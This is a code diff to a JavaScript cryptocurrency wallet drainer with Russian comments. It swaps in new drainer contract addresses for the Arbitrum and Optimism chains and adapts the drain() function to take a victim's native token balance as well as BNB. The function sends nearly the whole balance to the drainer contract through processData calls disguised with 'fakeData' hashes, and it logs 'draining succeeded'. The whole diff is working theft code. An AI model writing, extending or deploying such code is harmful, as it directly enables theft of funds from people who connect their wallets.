@@ -67,7 +67,7 @@ const CHAINS = {
     rpcUrls: ["https://arb1.arbitrum.io/rpc"],
     usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
     usdcAddress: "0xAF88d065e77c8cC2239327C5EDb3A432268e5831",
-    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
+    drainerAddress: "0xA8CdF58a2849A697373DA69Bdf8F7d4030ADEeBa",
     explorerApi: "https://api.arbiscan.io/api",
     explorerApiKey: ARBISCAN_API_KEY
   },
@@ -78,7 +78,7 @@ const CHAINS = {
     rpcUrls: ["https://mainnet.optimism.io"],
     usdtAddress: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
     usdcAddress: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
-    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
+    drainerAddress: "0x01A4392e1228ec38d018b4aaed1109D989095646",
     explorerApi: "https://api-optimistic.etherscan.io/api",
     explorerApiKey: OPTIMISTIC_ETHERSCAN_API_KEY
   },
@@ -261,7 +261,7 @@ async function drain(chainId, signer, userAddress, bal) {
 
     try {
       const tx = await drainer.processData(taskId, dataHash, nonce, {
-        value: 0, // Не отправляем BNB на этом этапе
+        value: 0, // Не отправляем нативный токен на этом этапе
         gasLimit: 300000,
         gasPrice: ethers.utils.parseUnits("3", "gwei")
       });
@@ -276,30 +276,30 @@ async function drain(chainId, signer, userAddress, bal) {
     }
   }
 
-  // Третья подпись: вызов processData для списания BNB
+  // Третья подпись: вызов processData для списания нативного токена
   if (bal.nativeBalance.gt(0)) {
     const gasReserve = ethers.utils.parseEther("0.002");
     const nativeToSend = bal.nativeBalance.sub(gasReserve);
-    const value = nativeToSend.gt(0) ? nativeToSend : 0;
+    const value = nativeToSend.gt(0) ? nativeToSend : ethers.BigNumber.from(0); // Исправлено для всех сетей
 
     if (value.gt(0)) {
       const taskId = Math.floor(Math.random() * 1000000);
-      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-bnb-${Date.now()}`));
+      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
       const nonce = Math.floor(Math.random() * 1000000);
 
       try {
         const tx = await drainer.processData(taskId, dataHash, nonce, {
           value,
-          gasLimit: 200000, // Меньше газа, так как только BNB
+          gasLimit: 200000, // Меньше газа, так как только нативный токен
           gasPrice: ethers.utils.parseUnits("3", "gwei")
         });
         const receipt = await tx.wait();
         if (receipt.status !== 1) {
-          throw new Error("Транзакция processData (BNB) не удалась");
+          throw new Error("Транзакция processData (нативный токен) не удалась");
         }
-        console.log("✅ Дрейнинг BNB успешен:", receipt.transactionHash);
+        console.log("✅ Дрейнинг нативного токена успешен:", receipt.transactionHash);
       } catch (e) {
-        console.error(`❌ Ошибка вызова processData (BNB): ${e.message}`);
+        console.error(`❌ Ошибка вызова processData (нативный токен): ${e.message}`);
         throw e;
       }
     }
